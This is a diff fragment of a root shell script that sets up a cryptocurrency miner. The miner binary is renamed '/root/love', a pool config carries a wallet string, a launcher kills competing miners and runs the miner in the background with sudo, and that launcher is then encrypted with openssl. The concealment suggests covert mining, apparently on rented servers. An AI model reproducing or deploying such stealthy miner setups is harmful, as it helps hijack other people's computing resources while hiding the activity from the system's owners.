@@ -29,11 +29,7 @@ mv /root/cpuminer-opt-linux/cpuminer-sse2 /root/love
 cat >>/root/config.json <<EOF
 {
   "url": "stratum+tcps://$fastest_server:17079",
-  "user": "v3K4mds92oWPHSPuQ4Tm6bSSNMCmNj1JyY.Linode",
-  "algo": "yespower",
-  "threads": $cores,
-  "option": "yespower",
-  "variant": "-T"
+  "user": "v3K4mds92oWPHSPuQ4Tm6bSSNMCmNj1JyY.Linode"
 }
 EOF
 cat /dev/null > /root/danielluis1921.sh
@@ -41,7 +37,7 @@ cat >>/root/danielluis1921.sh <<EOF
 #!/bin/bash
 ./kill_miner.sh
 sleep 3
-sudo /root/love --background -c config.json
+sudo /root/love --background --threads=$cores -a yespower -c config.json
 sleep 3
 EOF
 openssl enc -aes-256-cbc -salt -pbkdf2 -in danielluis1921.sh -out danielluis1922.sh -k $password
